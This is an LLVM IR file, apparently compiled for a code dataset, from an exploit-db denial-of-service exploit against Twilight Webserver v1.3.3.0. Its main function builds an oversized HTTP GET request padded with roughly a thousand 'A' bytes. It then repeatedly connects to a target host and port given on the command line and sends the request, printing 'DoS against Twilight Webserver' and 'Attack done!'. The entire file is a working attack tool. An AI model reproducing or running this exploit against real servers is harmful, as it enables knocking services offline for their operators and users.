; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_22897.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_22897.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.get = private unnamed_addr constant [3 x i8] c"GET", align 1
@__const.main.http = private unnamed_addr constant [12 x i8] c"HTTP/1.0\0D\0A\00\00", align 1
@.str = private unnamed_addr constant [27 x i8] c"Usage: %s [target] <port>\0A\00", align 1
@.str.1 = private unnamed_addr constant [15 x i8] c"Unknown host!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [41 x i8] c"DoS against Twilight Webserver v1.3.3.0\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [23 x i8] c"Can't start socket()!\0A\00", align 1
@.str.4 = private unnamed_addr constant [30 x i8] c"Connection to server broken!\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"Attack done!...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca [1052 x i8], align 16
  %10 = alloca [1037 x i8*], align 16
  %11 = alloca [3 x i8], align 1
  %12 = alloca [12 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = bitcast [3 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %13, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.main.get, i32 0, i32 0), i64 3, i1 false)
  %14 = bitcast [12 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %14, i8* align 1 getelementptr inbounds ([12 x i8], [12 x i8]* @__const.main.http, i32 0, i32 0), i64 12, i1 false)
  %15 = getelementptr inbounds [1037 x i8*], [1037 x i8*]* %10, i64 0, i64 0
  %16 = call i32 @memset(i8** %15, i32 65, i32 1037)
  %17 = getelementptr inbounds [1052 x i8], [1052 x i8]* %9, i64 0, i64 0
  %18 = getelementptr inbounds [3 x i8], [3 x i8]* %11, i64 0, i64 0
  %19 = call i32 @strncpy(i8* %17, i8* %18, i32 1051)
  %20 = getelementptr inbounds [1052 x i8], [1052 x i8]* %9, i64 0, i64 0
  %21 = getelementptr inbounds [1037 x i8*], [1037 x i8*]* %10, i64 0, i64 0
  %22 = getelementptr inbounds [1052 x i8], [1052 x i8]* %9, i64 0, i64 0
  %23 = call i32 @strlen(i8* %22)
  %24 = sext i32 %23 to i64
  %25 = sub i64 1052, %24
  %26 = sub i64 %25, 1
  %27 = call i32 (i8*, ...) @strncat(i8* %20, i8** %21, i64 %26)
  %28 = getelementptr inbounds [1052 x i8], [1052 x i8]* %9, i64 0, i64 0
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %12, i64 0, i64 0
  %30 = getelementptr inbounds [1052 x i8], [1052 x i8]* %9, i64 0, i64 0
  %31 = call i32 @strlen(i8* %30)
  %32 = sext i32 %31 to i64
  %33 = sub i64 1052, %32
  %34 = sub i64 %33, 1
  %35 = call i32 (i8*, ...) @strncat(i8* %28, i8* %29, i64 %34)
  %36 = load i32, i32* %4, align 4
  %37 = icmp slt i32 %36, 3
  br i1 %37, label %38, label %44

38:                                               ; preds = %2
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 0
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i8* %41)
  %43 = call i32 @exit(i32 0) #4
  unreachable

44:                                               ; preds = %2
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call %struct.hostent* @gethostbyname(i8* %47)
  store %struct.hostent* %48, %struct.hostent** %8, align 8
  %49 = icmp eq %struct.hostent* %48, null
  br i1 %49, label %50, label %53

50:                                               ; preds = %44
  %51 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  %52 = call i32 @exit(i32 0) #4
  unreachable

53:                                               ; preds = %44
  %54 = load i32, i32* @AF_INET, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %54, i32* %55, align 4
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 2
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58)
  %60 = call i32 @htons(i32 %59)
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %60, i32* %61, align 4
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 1
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @inet_addr(i8* %64)
  %66 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %67 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %66, i32 0, i32 0
  store i32 %65, i32* %67, align 4
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.2, i64 0, i64 0))
  br label %69

69:                                               ; preds = %94, %53
  %70 = load i32, i32* @AF_INET, align 4
  %71 = load i32, i32* @SOCK_STREAM, align 4
  %72 = call i32 @socket(i32 %70, i32 %71, i32 0)
  store i32 %72, i32* %6, align 4
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %77

74:                                               ; preds = %69
  %75 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %76 = call i32 @exit(i32 0) #4
  unreachable

77:                                               ; preds = %69
  %78 = load i32, i32* %6, align 4
  %79 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %80 = call i64 @connect(i32 %78, %struct.sockaddr* %79, i32 12)
  %81 = icmp slt i64 %80, 0
  br i1 %81, label %82, label %86

82:                                               ; preds = %77
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.4, i64 0, i64 0))
  %84 = load i32, i32* %6, align 4
  %85 = call i32 @close(i32 %84)
  br label %86

86:                                               ; preds = %82, %77
  %87 = load i32, i32* %6, align 4
  %88 = getelementptr inbounds [1052 x i8], [1052 x i8]* %9, i64 0, i64 0
  %89 = getelementptr inbounds [1052 x i8], [1052 x i8]* %9, i64 0, i64 0
  %90 = call i32 @strlen(i8* %89)
  %91 = call i64 @write(i32 %87, i8* %88, i32 %90)
  %92 = icmp slt i64 %91, 0
  br i1 %92, label %93, label %94

93:                                               ; preds = %86
  br label %97

94:                                               ; preds = %86
  %95 = load i32, i32* %6, align 4
  %96 = call i32 @close(i32 %95)
  br label %69

97:                                               ; preds = %93
  %98 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memset(i8**, i32, i32) #2

declare dso_local i32 @strncpy(i8*, i8*, i32) #2

declare dso_local i32 @strncat(i8*, ...) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i64 @write(i32, i8*, i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
